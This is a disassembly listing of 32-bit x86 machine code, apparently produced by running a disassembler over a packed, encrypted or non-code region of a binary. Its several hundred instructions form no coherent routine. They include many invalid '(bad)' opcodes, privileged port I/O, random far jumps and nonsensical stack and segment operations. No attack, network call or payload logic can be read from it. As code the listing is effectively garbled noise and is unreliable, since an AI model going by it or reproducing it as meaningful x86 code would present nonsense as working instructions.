  4118cc:	jbe    0x4118f3
  4118ce:	mov    dl,0xd6
  4118d0:	adc    eax,0x3e5f4cac
  4118d5:	sbb    edx,DWORD PTR [edi]
  4118d7:	inc    ebp
  4118d8:	mov    ebp,0x86d40ba7
  4118dd:	leave  
  4118de:	clc    
  4118df:	and    dl,bl
  4118e1:	in     eax,dx
  4118e2:	add    DWORD PTR [ecx+0x5efbbf13],edx
  4118e8:	xor    al,bl
  4118ea:	mul    bh
  4118ec:	and    ch,BYTE PTR [eax+0x38]
  4118ef:	pop    esi
  4118f0:	cmp    edx,DWORD PTR [edi+eiz*1+0x14]
  4118f4:	dec    ebp
  4118f5:	jmp    0x962e:0x2dad4a88
  4118fc:	sub    DWORD PTR [ecx+eiz*4],0x55a2e2cc
  411903:	jnp    0x41197f
  411905:	xchg   DWORD PTR [ebx+0x59],ecx
  411908:	cdq    
  411909:	aas    
  41190a:	cmp    eax,0x61b8a7c9
  41190f:	inc    ebp
  411910:	jns    0x4118dd
  411912:	mov    WORD PTR [ecx-0x69],ss
  411915:	enter  0xdc60,0x64
  411919:	inc    esp
  41191b:	or     al,0x55
  41191d:	push   ebx
  41191e:	fisttp QWORD PTR [ebx+0x20]
  411921:	adc    eax,0x3472f8b0
  411926:	xor    BYTE PTR [ecx*1+0x4f9359fc],bl
  41192d:	push   0xfffffff3
  41192f:	inc    eax
  411930:	test   al,0x9
  411932:	retf   0xcccd
  411935:	cwde   
  411936:	sub    eax,0x7ec65367
  41193b:	enter  0xa942,0x60
  41193f:	js     0x41196c
  411941:	cmc    
  411942:	push   ebx
  411943:	xchg   esi,eax
  411944:	sbb    al,0x65
  411946:	scas   al,BYTE PTR es:[edi]
  411947:	xor    ebx,ecx
  411949:	shl    dl,0x13
  41194c:	jecxz  0x4119b0
  41194e:	pop    ebx
  41194f:	xchg   esi,eax
  411950:	add    DWORD PTR [ecx+0x22],ebp
  411953:	xlat   BYTE PTR ds:[ebx]
  411954:	daa    
  411955:	fmulp  st(0),st
  411957:	xchg   ebp,eax
  411958:	dec    esi
  411959:	test   BYTE PTR [ebx],cl
  41195b:	xchg   esi,eax
  41195c:	scas   eax,DWORD PTR es:[edi]
  41195d:	sbb    eax,DWORD PTR [ecx+0x10]
  411960:	xor    al,0x3e
  411962:	aas    
  411963:	mov    dl,0x69
  411965:	push   ebp
  411966:	push   cs
  411967:	mov    esi,DWORD PTR [edi]
  411969:	mov    esp,0xda08231d
  41196e:	iret   
  41196f:	call   FWORD PTR [ebp+0x2bd83d61]
  411975:	adc    ch,bl
  411977:	pop    eax
  411978:	(bad)  
  411979:	mov    ebp,0x4e6b7fbc
  41197e:	icebp  
  41197f:	or     esp,DWORD PTR [ebp+0x6cf58f9f]
  411985:	mov    bh,BYTE PTR [esi]
  411987:	in     al,dx
  411988:	and    eax,0xf4b44f22
  41198d:	push   0x60
  41198f:	imul   esi,DWORD PTR [ebp-0x51a7036e],0x29d5fa02
  411999:	lock in eax,dx
  41199b:	mov    ebx,0x5eecb66e
  4119a0:	push   esp
  4119a1:	shl    DWORD PTR ds:0xb05a6722,cl
  4119a7:	shl    BYTE PTR [edx+eiz*8],0x6f
  4119ab:	ret    0x4b28
  4119ae:	xchg   edx,eax
  4119af:	cwde   
  4119b0:	push   eax
  4119b1:	lahf   
  4119b2:	imul   ebp,DWORD PTR [edx+0x2cdca23f],0xcb425545
  4119bc:	dec    eax
  4119bd:	dec    ebx
  4119be:	and    bh,BYTE PTR [ebp-0x6b732d35]
  4119c4:	jle    0x411a0c
  4119c6:	inc    edx
  4119c7:	mov    al,0xb0
  4119c9:	shr    BYTE PTR [ecx+eax*2],0x30
  4119cd:	lock repz lock (bad) 
  4119d1:	lods   al,BYTE PTR ds:[esi]
  4119d2:	fldcw  WORD PTR [edi-0x2dc3e278]
  4119d8:	aad    0xa2
  4119da:	dec    ebx
  4119db:	mov    ebx,0xf67939b7
  4119e0:	and    al,0x46
  4119e2:	lds    ebp,FWORD PTR [eax+0x78]
  4119e5:	retf   0x5e1
  4119e8:	imul   eax,DWORD PTR [edx-0x56],0x7b
  4119ec:	cmp    al,0x16
  4119ee:	lds    ebx,FWORD PTR [esi+0x8adcbdf]
  4119f4:	(bad)  [eax+0x7f]
  4119f7:	and    dh,al
  4119f9:	rcr    BYTE PTR [edi-0x49],1
  4119fc:	cmp    BYTE PTR [esi-0x54],bl
  4119ff:	in     eax,0xfc
  411a01:	or     ah,0x13
  411a04:	mov    dl,0x28
  411a06:	rcr    BYTE PTR [eax-0x5c5b17ef],1
  411a0c:	repz xchg ebx,eax
  411a0e:	mov    ecx,es
  411a10:	or     al,0x67
  411a12:	ins    BYTE PTR es:[edi],dx
  411a13:	cmp    BYTE PTR [ebp+ecx*2+0x61],cl
  411a17:	push   ds
  411a18:	mov    bl,0xec
  411a1a:	pusha  
  411a1b:	ret    
  411a1c:	aam    0xcd
  411a1e:	test   DWORD PTR [edi-0x22],ebp
  411a21:	dec    esp
  411a22:	adc    al,0xa7
  411a24:	mov    esi,0x739e1400
  411a29:	xchg   DWORD PTR [ecx],esp
  411a2b:	mov    WORD PTR [bx+di+0x14b],ds
  411a30:	mov    al,ds:0x4024d1f1
  411a35:	mov    ah,ch
  411a37:	xchg   edx,eax
  411a38:	stos   DWORD PTR es:[edi],eax
  411a39:	(bad)  [eax+ebp*2-0x53]
  411a3d:	or     eax,0xd3388ecc
  411a42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a43:	push   esp
  411a44:	in     al,0x29
  411a46:	ins    BYTE PTR es:[edi],dx
  411a47:	inc    eax
  411a48:	push   eax
  411a49:	retf   
  411a4a:	and    al,0x1b
  411a4c:	push   ebx
  411a4d:	jge    0x411ac7
  411a4f:	push   0x40f3d89
  411a54:	fsubr  st(1),st
  411a56:	mov    bh,0x16
  411a58:	in     eax,0x47
  411a5a:	gs dec esp
  411a5c:	mov    eax,ds:0x73aa59d5
  411a61:	sahf   
  411a62:	adc    BYTE PTR [esi-0x32],0x1d
  411a66:	stos   DWORD PTR es:[edi],eax
  411a67:	adc    DWORD PTR [eax],0x4c57456b
  411a6d:	ja     0x411ab8
  411a6f:	push   edi
  411a70:	push   0x64
  411a72:	mov    DWORD PTR [bx+di-0x456e],0x29823ca5
  411a7b:	(bad)  
  411a7c:	mov    edx,0x8b1032e3
  411a81:	imul   DWORD PTR [ecx]
  411a83:	or     ah,BYTE PTR [ecx+0x3efc9285]
  411a89:	in     al,dx
  411a8a:	dec    ecx
  411a8b:	push   cs
  411a8c:	jl     0x411a40
  411a8e:	cs das 
  411a90:	lock pop eax
  411a92:	je     0x411ad2
  411a94:	push   0xffffff80
  411a96:	mov    al,0xd1
  411a98:	(bad)  
  411a99:	fld    TBYTE PTR [ecx+0x9]
  411a9c:	inc    esi
  411a9d:	push   ss
  411a9e:	inc    ebp
  411a9f:	pop    edx
  411aa0:	lock and esi,esp
  411aa3:	int    0xe3
  411aa5:	jne    0x411b02
  411aa7:	(bad)  
  411aa8:	adc    BYTE PTR [esi],bh
  411aaa:	(bad)  
  411aac:	ret    0xa99d
  411aaf:	in     eax,dx
  411ab0:	call   0x8404:0x6db85085
  411ab7:	inc    edx
  411ab8:	sub    BYTE PTR [edx-0x6f],dl
  411abb:	dec    esp
  411abc:	iret   
  411abd:	rcl    BYTE PTR [esi+0x59],cl
  411ac0:	retf   
  411ac1:	ror    DWORD PTR [eax],0xe4
  411ac4:	mov    edi,DWORD PTR [esi]
  411ac6:	lea    esp,[edi]
  411ac8:	nop
  411ac9:	add    BYTE PTR [esi],al
  411acb:	mov    edx,0x32827f52
  411ad0:	inc    ebp
  411ad1:	inc    ebx
  411ad2:	xchg   edi,eax
  411ad3:	jge    0x411a76
  411ad5:	mov    bl,0xe3
  411ad7:	or     eax,0x65b9d513
  411adc:	mov    esp,0x644b4ab
  411ae1:	push   ecx
  411ae2:	sbb    al,0x8b
  411ae4:	dec    eax
  411ae5:	ret    0x250a
  411ae8:	or     esi,eax
  411aea:	icebp  
  411aeb:	sbb    BYTE PTR [edx],bl
  411aed:	add    ebx,DWORD PTR cs:[esi+esi*1-0x42]
  411af2:	mov    DWORD PTR [esi+0x13],0x5ee9723a
  411af9:	rol    DWORD PTR [ecx],1
  411afb:	xchg   DWORD PTR ds:0x690352df,esi
  411b01:	dec    esi
  411b02:	in     al,0x6f
  411b04:	xlat   BYTE PTR ds:[ebx]
  411b05:	pop    edi
  411b06:	aaa    
  411b07:	aam    0xc1
  411b09:	lock clc 
  411b0b:	scas   al,BYTE PTR es:[edi]
  411b0c:	fsub   st(4),st
  411b0e:	into   
  411b0f:	mov    ds:0x1aaecfec,al
  411b14:	cmp    al,0xfe
  411b16:	popa   
  411b17:	imul   ebp,DWORD PTR [eax-0x25fbab90],0xfffffff3
  411b1e:	and    bl,BYTE PTR [ebp+0x7e]
  411b21:	addr16 cwde 
  411b23:	js     0x411ad8
  411b25:	shl    edx,cl
  411b27:	mov    ebx,0x52c77bea
  411b2c:	mov    ebx,0x12f1c955
  411b31:	mov    esi,0xae53bd30
  411b36:	cmp    BYTE PTR [esi],0xf0
  411b39:	jne    0x411b8e
  411b3b:	stc    
  411b3c:	(bad)  
  411b3d:	xchg   esi,eax
  411b3e:	add    dl,BYTE PTR [eax-0x569b940e]
  411b44:	cmp    esp,ebx
  411b46:	cmp    DWORD PTR [eax+0x214ac3fe],eax
  411b4c:	fist   DWORD PTR [ecx+ebx*8-0x52dcba00]
  411b53:	ss xor edx,0x3016da8
  411b5a:	fwait
  411b5b:	and    al,BYTE PTR [eax+eiz*4]
  411b5e:	inc    edi
  411b5f:	add    edi,DWORD PTR ds:0x5a7b3f70
  411b65:	cmp    DWORD PTR [eax+0x2e],0x6fa725e1
  411b6c:	ror    BYTE PTR [ebp+0x31],1
  411b6f:	loop   0x411b65
  411b71:	out    0x8f,al
  411b73:	gs leave 
  411b75:	and    eax,DWORD PTR [ecx+0x7c8ca80d]
  411b7b:	mov    ds:0x574f18d0,eax
  411b80:	idiv   ebx
  411b82:	es inc esi
  411b84:	or     eax,0x18e5191d
  411b89:	lods   eax,DWORD PTR ds:[esi]
  411b8a:	add    bl,bl
  411b8c:	out    dx,eax
  411b8d:	hlt    
  411b8e:	jo     0x411b18
  411b90:	dec    edi
  411b91:	or     BYTE PTR [ebx+0x4ae31a20],dl
  411b97:	lock push esi
  411b99:	mov    BYTE PTR [edx],dh
  411b9b:	out    0xf8,al
  411b9d:	inc    eax
  411b9e:	xor    DWORD PTR [ebx+0x2d],edx
  411ba1:	sbb    DWORD PTR [edx-0x1c77fb0c],ebx
  411ba7:	adc    BYTE PTR [edi+0x4e],bl
  411baa:	push   cs
  411bab:	not    ebp
  411bad:	mov    ecx,0x8ecea181
  411bb2:	ins    BYTE PTR es:[edi],dx
  411bb3:	(bad)  
  411bb5:	jae    0x411bbd
  411bb7:	sub    BYTE PTR [edx-0x37742e52],ch
  411bbd:	pop    edi
  411bbe:	dec    ebx
  411bbf:	mov    edx,0x3102fd6
  411bc4:	fdiv   DWORD PTR [ebp+0x1a]
  411bc7:	cmp    al,0xe1
  411bc9:	repnz ds pop ebp
  411bcc:	push   ecx
  411bcd:	mov    DWORD PTR [edx-0x2f29499e],ecx
  411bd3:	adc    BYTE PTR [esi],ah
  411bd5:	add    al,0x32
  411bd7:	iret   
  411bd8:	fwait
  411bd9:	mov    ebp,0x8d9314e8
  411bde:	mov    edi,0x65071c14
  411be3:	xchg   ebx,eax
  411be4:	test   al,0x8c
  411be6:	xor    BYTE PTR [edi],0x13
  411be9:	sub    ebx,DWORD PTR [edi+0x4b8bb566]
  411bef:	ffree  st(7)
  411bf1:	aam    0x39
  411bf3:	or     DWORD PTR [ebp+0xaf72150],ebp
  411bf9:	push   esi
  411bfa:	dec    ecx
  411bfb:	xor    ecx,DWORD PTR [esi-0x64]
  411bfe:	out    0x1,eax
  411c00:	sbb    DWORD PTR [ebx],esi
  411c02:	leave  
  411c03:	mov    eax,0x54a82081
  411c08:	ins    BYTE PTR es:[edi],dx
  411c09:	dec    eax
  411c0a:	cmp    al,0xba
  411c0c:	mov    cl,0xe8
  411c0e:	shl    dh,0x66
  411c11:	xor    eax,DWORD PTR [edi]
  411c13:	mov    DWORD PTR [eax+0x78],esi
  411c16:	add    ebx,eax
  411c18:	mov    ch,0xfc
  411c1a:	ds sbb al,0xc0
  411c1d:	mov    esp,0xd88359bd
  411c22:	leave  
  411c23:	test   BYTE PTR [edi+0x550dcbcb],cl
  411c29:	jbe    0x411ca3
  411c2b:	xchg   ebp,eax
  411c2c:	and    al,0x45
  411c2e:	mov    edi,0x45470d4a
  411c33:	shl    DWORD PTR [edi+0x12e90b5c],1
  411c39:	jne    0x411c9f
  411c3b:	xchg   edi,eax
  411c3c:	push   ds
  411c3d:	adc    al,0x50
  411c3f:	inc    ebx
  411c41:	jbe    0x411be5
  411c43:	in     eax,0xca
  411c45:	ins    BYTE PTR es:[edi],dx
  411c46:	iret   
  411c47:	stos   BYTE PTR es:[edi],al
  411c48:	dec    ebx
  411c49:	inc    ebp
  411c4b:	xor    BYTE PTR [edi],0x79
  411c4e:	add    al,0x36
  411c50:	ds sub al,0x93
  411c53:	xor    eax,DWORD PTR [ebp+esi*4-0x771b7ecb]
  411c5a:	std    
  411c5b:	shl    BYTE PTR [eax],1
  411c5d:	pop    es
  411c5e:	repz out dx,al
  411c60:	ret    0x197a
  411c63:	ret    0xde72
  411c66:	dec    ebx
  411c67:	pop    edx
  411c68:	je     0x411c09
  411c6a:	mov    eax,ds:0xa38de42d
  411c6f:	ds sub ch,al
  411c72:	push   eax
  411c73:	fisubr DWORD PTR [ebx-0x7855139a]
  411c79:	adc    ebx,DWORD PTR [edi]
  411c7b:	das    
  411c7c:	dec    edx
  411c7d:	(bad)  
  411c7e:	jl     0x411ce9
  411c80:	sub    DWORD PTR [eax],ebp
  411c82:	or     eax,0xbb013f74
  411c87:	dec    esi
  411c88:	mov    ds:0xe8578b9f,al
  411c8d:	cmp    DWORD PTR [ecx+0x5d],edx
  411c90:	sahf   
  411c91:	repz ret 0xb717
  411c95:	jno    0x411d13
  411c97:	es mov gs,ebx
  411c9a:	and    eax,0xcc7fd111
  411c9f:	add    ah,bl
  411ca1:	shl    DWORD PTR [eax+ecx*8+0x3fe42046],0x1e
  411ca9:	imul   esi,DWORD PTR ds:[edi],0xc416ae4e
  411cb0:	pop    edi
  411cb1:	sar    DWORD PTR [ecx+esi*1+0x2c],1
  411cb5:	fnstenv [ecx]
  411cb7:	outs   dx,BYTE PTR ds:[esi]
  411cb8:	pop    ss
  411cb9:	xor    BYTE PTR [ecx-0x1b8d5b84],0x4
  411cc0:	call   0xa4691921
  411cc5:	popf   
  411cc6:	or     BYTE PTR [ecx-0x5f],dh
  411cc9:	sbb    ecx,DWORD PTR [esi+0x32]
  411ccc:	mov    DWORD PTR [ebp+0x4907d2b0],eax
  411cd2:	jns    0x411d0c
  411cd4:	mov    bh,0x9
  411cd6:	in     eax,0xc9
  411cd8:	pop    esp
  411cd9:	xchg   DWORD PTR [edi+0x1f],eax
  411cdc:	dec    esp
  411cdd:	push   esp
  411cde:	mov    esi,0xfd932375
  411ce3:	mov    bh,0x41
  411ce5:	xor    DWORD PTR es:[eax-0xa],esp
  411ce9:	jle    0x411d14
  411ceb:	push   ss
  411cec:	xchg   ebp,eax
  411ced:	push   ds
  411cee:	cwde   
  411cef:	retf   0x6aab
  411cf2:	(bad)  
  411cf3:	xchg   edi,eax
  411cf4:	loop   0x411ca8
  411cf6:	ins    BYTE PTR es:[edi],dx
  411cf7:	push   edx
  411cf8:	pop    edx
  411cf9:	ja     0x411d1f
  411cfb:	add    esi,DWORD PTR [eax]
  411cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cfe:	cmp    bl,BYTE PTR [edx+0x3ed4e01]
  411d04:	xor    eax,ebx
  411d06:	pop    es
  411d07:	shl    BYTE PTR [esi+0x58f057c5],cl
  411d0d:	xor    ah,dh
  411d0f:	iret   
  411d10:	or     al,BYTE PTR [edi]
  411d12:	or     al,0xf9
  411d14:	push   ds
  411d15:	jno    0x411cb1
  411d17:	xchg   esi,eax
  411d18:	mov    esp,0x3403a9b6
  411d1d:	lods   al,BYTE PTR ds:[esi]
  411d1e:	sub    al,0x1c
  411d20:	adc    dh,0xe9
  411d23:	jno    0x411d6f
  411d25:	xchg   edi,eax
  411d26:	inc    edx
  411d27:	call   0x8e78:0xcc77a4c7
  411d2e:	loop   0x411d58
  411d30:	and    al,0x35
  411d32:	repnz popa 
  411d34:	sbb    ecx,DWORD PTR ss:[ebp-0x13]
  411d38:	xor    eax,0x2d3361b5
  411d3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d3e:	jb     0x411cfe
  411d40:	popf   
  411d41:	or     eax,0xddbeb327
  411d46:	jno    0x411d70
  411d48:	les    ecx,FWORD PTR [edi-0x40]
  411d4b:	pop    es
  411d4c:	xchg   ecx,eax
  411d4d:	test   al,0x1c
  411d4f:	mov    eax,0x5f3b75ce
  411d54:	push   eax
  411d55:	adc    BYTE PTR [edi+0x60],bh
  411d58:	gs pop ds
  411d5a:	jge    0x411d2c
  411d5c:	push   esp
  411d5d:	mov    ch,0xdb
  411d5f:	add    ebx,esi
  411d61:	jmp    0x141a:0x664cc767
  411d68:	fcmovb st,st(4)
  411d6a:	push   es
  411d6b:	sbb    dh,dl
  411d6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d6e:	push   ebp
  411d6f:	jns    0x411db3
  411d71:	gs push esi
  411d73:	loopne 0x411d1a
  411d75:	push   ebx
  411d76:	jae    0x411d35
  411d78:	jp     0x411d22
  411d7a:	test   eax,0xe4130ec3
  411d7f:	dec    ebx
  411d80:	imul   eax,DWORD PTR [esi+0x55fa828c],0xffffff86
  411d87:	int3   
  411d88:	xchg   esi,eax
  411d89:	(bad)  
  411d8a:	test   eax,0xab2ef264
  411d8f:	xor    dh,BYTE PTR [edi]
  411d91:	jb     0x411d62
  411d93:	in     eax,dx
  411d94:	xor    eax,0x319b10f3
  411d99:	mov    dl,0x1b
  411d9b:	adc    ebx,DWORD PTR [ebx+0x67e34ea5]
  411da1:	and    eax,0xfa15cb2e
  411da6:	jl     0x411dc8
  411da8:	in     eax,dx
  411da9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411daa:	pop    es
  411dab:	xabort 0xe0
  411dae:	xchg   edi,eax
  411daf:	int    0x2b
  411db1:	shl    BYTE PTR [edx-0x45],cl
  411db4:	xor    eax,0x6041fdce
  411db9:	iret   
  411dba:	gs jbe 0x411d5c
  411dbd:	push   eax
  411dbe:	cmp    BYTE PTR [ebx+0x19],bh
  411dc1:	fidivr DWORD PTR [edi+esi*2-0x29]
  411dc5:	loop   0x411d83
  411dc7:	mov    eax,0x6f309d1
  411dcc:	mov    DWORD PTR [ecx+0x6],0x70e3692d
  411dd3:	ret    
  411dd4:	mov    fs,WORD PTR [edx]
  411dd6:	add    BYTE PTR [edx],bh
  411dd8:	inc    ecx
  411dd9:	dec    ecx
  411dda:	push   edx
  411ddb:	es mov ecx,0xa98a760a
  411de1:	mov    cl,0x22
  411de3:	jle    0x411ddc
  411de5:	lods   eax,DWORD PTR ds:[esi]
  411de6:	call   DWORD PTR [ecx+0xebe0c9a]
  411dec:	pop    ebp
  411ded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dee:	iret   
  411def:	xchg   al,dl
  411df1:	rol    BYTE PTR [eax+0x4e],0x67
  411df5:	push   ss
  411df6:	aaa    
  411df7:	inc    ebp
  411df8:	(bad)  
  411df9:	pop    edi
  411dfa:	aam    0x73
  411dfc:	fwait
  411dfd:	gs push esi
  411dff:	inc    esi
  411e00:	xor    ecx,0xffffff8f
  411e03:	ret    
  411e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e05:	cmp    DWORD PTR [ecx+0x99f5815],edi
  411e0b:	xor    eax,0xb18f98da
  411e10:	sub    BYTE PTR [edi-0x20],bl
  411e13:	pop    ebp
  411e14:	in     al,dx
  411e15:	ret    
  411e16:	push   bx
  411e18:	lods   eax,DWORD PTR ds:[esi]
  411e19:	xor    eax,0x5babdb71
  411e1e:	pop    ds
  411e1f:	nop
  411e20:	cs out 0x68,eax
  411e23:	gs cs cmp al,0x71
  411e28:	fbstp  TBYTE PTR [edi-0x659f82dc]
  411e2e:	mov    BYTE PTR [eax+edi*2-0x4f],ch
  411e32:	(bad)  
  411e33:	fisttp WORD PTR [esi]
  411e35:	inc    esi
  411e36:	or     al,0xbb
  411e38:	call   0x1884:0x8fc4c203
  411e3f:	idiv   BYTE PTR [edx]
  411e41:	jmp    DWORD PTR [edx]
  411e43:	mov    ds:0x4d4ba168,al
  411e48:	pop    ebx
  411e49:	dec    edx
  411e4a:	xchg   ecx,eax
  411e4b:	enter  0xc7e0,0x7e
  411e4f:	jns    0x411e3b
  411e51:	mov    ch,0xae
  411e53:	enter  0x8a8,0x7c
  411e57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e58:	jg     0x411e44
  411e5a:	fcomp  st(1)
  411e5c:	pusha  
  411e5d:	cmp    eax,0xb65b9e5c
  411e62:	jle    0x411e7c
  411e64:	adc    DWORD PTR [edi+0x38],eax
  411e67:	mov    bh,0x15
  411e69:	push   0xb47032bc
  411e6e:	stos   DWORD PTR es:[edi],eax
  411e6f:	jns    0x411e04
  411e71:	test   DWORD PTR [ebx-0x76],ebp
  411e74:	jg     0x411e24
  411e76:	call   0xaad2372
  411e7b:	loope  0x411e59
  411e7d:	aaa    
  411e7e:	into   
  411e7f:	mov    cl,BYTE PTR [ebx+ecx*2+0x5b]
  411e83:	dec    ebp
  411e84:	outs   dx,DWORD PTR ds:[esi]
  411e85:	call   ecx
  411e87:	xchg   ecx,eax
  411e88:	xchg   bh,dl
  411e8a:	pop    ebx
  411e8b:	push   es
  411e8c:	sub    al,BYTE PTR [edi]
  411e8e:	jmp    0x411eac
  411e90:	fiadd  WORD PTR [ebx-0x6d]
  411e93:	fnstsw WORD PTR [ecx-0x15]
  411e96:	add    DWORD PTR [esi-0x55216902],0xbdb1f09c
  411ea0:	adc    eax,0x101cb206
  411ea5:	sbb    edi,DWORD PTR [eax-0x1d3c14fd]
  411eab:	rcr    ebx,cl
  411ead:	sub    DWORD PTR [esi-0x4385fb83],esi
  411eb3:	push   0x5b1e12f3
  411eb8:	fld    TBYTE PTR [ecx]
  411eba:	je     0x411e9e
  411ebc:	call   0x5d02d3e9
  411ec1:	and    edx,edx
  411ec3:	dec    eax
  411ec4:	jg     0x411e56
  411ec6:	pop    edx
  411ec7:	and    ebp,DWORD PTR [eax+edx*1+0x9]
  411ecb:	nop
  411ecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ecd:	lahf   
  411ece:	lock xor dh,BYTE PTR ds:0xc39594ba
  411ed5:	fs dec esi
  411ed7:	sbb    eax,0x2fe9a70
  411edc:	add    DWORD PTR [edx],ebx
  411ede:	loopne 0x411e7e
  411ee0:	sub    bl,BYTE PTR [ecx+0x5d]
  411ee3:	sbb    ebx,0x3571d236
  411ee9:	pop    eax
  411eea:	xchg   DWORD PTR ds:0x49141d1a,edx
  411ef0:	mov    ecx,0x3cd5eaff
  411ef5:	les    eax,FWORD PTR [ebx+0x7e9fd81b]
  411efb:	xor    eax,DWORD PTR [eax-0x6c5598ff]
  411f01:	fnstcw WORD PTR ds:0xc7a41c9a
  411f07:	cli    
  411f08:	sub    cl,BYTE PTR [ecx-0x51]
  411f0b:	popa   
  411f0c:	sub    DWORD PTR [ebx+0x1f48a955],0xf2ec8586
  411f16:	pop    eax
  411f17:	ins    BYTE PTR es:[edi],dx
  411f18:	lahf   
  411f19:	mul    BYTE PTR ds:0xaf680863
  411f1f:	xchg   esi,eax
  411f20:	dec    esp
  411f21:	cmp    DWORD PTR [ebx],0xfc65a1fe
  411f27:	mov    bl,0xf0
  411f29:	inc    eax
  411f2a:	inc    edx
  411f2b:	mov    bh,0xd
  411f2d:	test   cl,ch
  411f2f:	jp     0x411f21
  411f31:	sbb    al,0xce
  411f33:	xchg   ebp,eax
  411f34:	jle    0x411f2b
  411f36:	fldcw  WORD PTR ds:0x77ec3b21
  411f3c:	mov    ss,eax
  411f3e:	xchg   DWORD PTR [bp+si+0x6824],eax
  411f43:	xor    edx,DWORD PTR [edx+eax*2]
  411f46:	xor    BYTE PTR [ebx],ah
  411f48:	test   BYTE PTR [esi+0x66542502],bl
  411f4e:	ins    DWORD PTR es:[edi],dx
  411f4f:	or     ebp,DWORD PTR [eax-0x706ba7a2]
  411f55:	aas    
  411f56:	xchg   esi,eax
  411f57:	jo     0x411f38
  411f59:	cld    
  411f5a:	pop    esi
  411f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f5c:	(bad)  
  411f5d:	jmp    0xd0d0:0xacfce4aa
  411f64:	sbb    edi,esi
  411f66:	adc    BYTE PTR [eax+0x7f],bh
  411f69:	xchg   edx,eax
  411f6a:	push   ecx
  411f6b:	int3   
  411f6c:	out    dx,al
  411f6d:	repz push edx
  411f6f:	mov    bl,0x35
  411f71:	inc    ecx
  411f72:	in     al,dx
  411f73:	test   al,0x46
  411f75:	jmp    0xa3cd524a
  411f7a:	ret    
  411f7b:	rcl    BYTE PTR [eax],0x3b
  411f7e:	ret    0x6ed7
  411f81:	mov    al,ds:0xe37f6e6c
  411f86:	xchg   esp,eax
  411f87:	dec    ebx
  411f88:	pop    eax
  411f89:	sti    
  411f8a:	loop   0x411fd4
  411f8c:	and    BYTE PTR [edx],ch
  411f8e:	xchg   ecx,eax
  411f8f:	push   0x2bc2d6f
  411f94:	mov    dl,0x29
  411f96:	adc    ah,BYTE PTR [ecx]
  411f98:	daa    
  411f99:	add    eax,0xcf858a5f
  411f9e:	or     DWORD PTR [esi],esp
  411fa0:	call   0x1ccc9b0f
  411fa5:	fadd   DWORD PTR [edx+0x26868734]
  411fab:	or     BYTE PTR [ecx],cl
  411fad:	data16 hlt 
  411faf:	sub    bh,ah
  411fb1:	dec    edi
  411fb2:	daa    
  411fb3:	mov    ebx,0x235562e3
  411fb8:	stos   BYTE PTR es:[edi],al
  411fb9:	pop    ebp
  411fba:	pop    ecx
  411fbb:	jo     0x412015
  411fbd:	test   BYTE PTR [esi-0x2],0x62
  411fc1:	add    eax,0x5e4e8afe
  411fc6:	es mov esi,0x168ebc53
  411fcc:	fadd   DWORD PTR ds:0xc9b26daa
  411fd2:	je     0x411f88
  411fd4:	adc    BYTE PTR [edi],0x1b
  411fd7:	idiv   cl
  411fd9:	les    edi,FWORD PTR [esp+esi*8]
  411fdc:	loopne 0x41200c
  411fde:	jae    0x411feb
  411fe0:	cmp    BYTE PTR [ecx-0x4957ddde],al
  411fe6:	fdivrp st(1),st
  411fe8:	nop
  411fe9:	sbb    esp,DWORD PTR [ebx-0x27]
  411fec:	call   0x65f8c12d
  411ff1:	pop    eax
  411ff2:	test   DWORD PTR [edi+0x1e],esi
  411ff5:	repnz xchg esp,eax
  411ff7:	loop   0x411fd2
  411ff9:	xchg   edx,eax
  411ffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ffb:	dec    esp
  411ffc:	push   0x64
  411ffe:	shl    BYTE PTR [esi-0x52c7472],0x12
  412005:	and    DWORD PTR [ebx-0x714c2e64],esi
  41200b:	sbb    eax,0x9d98caf3
  412010:	retf   0x6ab4
  412013:	ret    
  412014:	mov    bl,0x5b
  412016:	das    
  412017:	in     eax,dx
  412018:	sub    cl,BYTE PTR [edi+0x75]
  41201b:	fwait
  41201c:	xor    eax,0xbcc8e5d5
  412021:	dec    edx
  412022:	pop    esp
  412023:	ins    BYTE PTR es:[edi],dx
  412024:	mov    ds:0xe223d074,al
  412029:	in     al,dx
  41202a:	sbb    eax,0x75492bdc
  41202f:	pop    ebp
  412030:	retf   0x233a
  412033:	les    edi,FWORD PTR [ecx+0xe964cb1]
  412039:	jae    0x41202c
  41203b:	(bad)  
  41203c:	lea    ax,[edx-0x388875dc]
  412043:	xchg   esi,eax
  412044:	outs   dx,BYTE PTR ds:[esi]
  412045:	and    al,0x25
  412047:	fadd   DWORD PTR [eax+0x5bf6e995]
  41204d:	sub    dl,BYTE PTR [edi-0x66]
  412050:	push   ecx
  412051:	imul   esi,DWORD PTR [eax+0x6d],0x8c9e430d
  412058:	mov    dh,0x5f
  41205a:	mov    ss,WORD PTR [ebp-0x6d]
  41205d:	pushf  
  41205e:	push   cs
  41205f:	shl    BYTE PTR [esi+eiz*8-0x3c],0x37
  412064:	mov    BYTE PTR [edx+0xa8c9106],al
  41206a:	hlt    
  41206b:	jp     0x41202b
  41206d:	mov    bh,0x3d
  41206f:	ret    
  412070:	mov    dl,bh
  412072:	stc    
  412073:	add    DWORD PTR [edi+eax*8-0x5545ec86],edi
  41207a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41207b:	popa   
  41207c:	fimul  WORD PTR [eax+eiz*8-0x334570a]
  412083:	pop    es
  412084:	mov    ss,WORD PTR [eax-0x8f2e18]
  41208a:	pop    ecx
  41208b:	xchg   esi,eax
  41208c:	sub    eax,0xd87f235f
  412091:	mov    dh,0x4e
  412093:	dec    ecx
  412094:	jo     0x4120de
  412096:	mul    BYTE PTR [eax+0x3a94438f]
  41209c:	jnp    0x4120d2
  41209e:	sbb    BYTE PTR [edi-0x50],0xaf
  4120a2:	push   0xcabbc7f0
  4120a7:	stos   BYTE PTR es:[edi],al
  4120a8:	loopne 0x41206a
  4120aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120ab:	add    eax,0x7f72b9e4
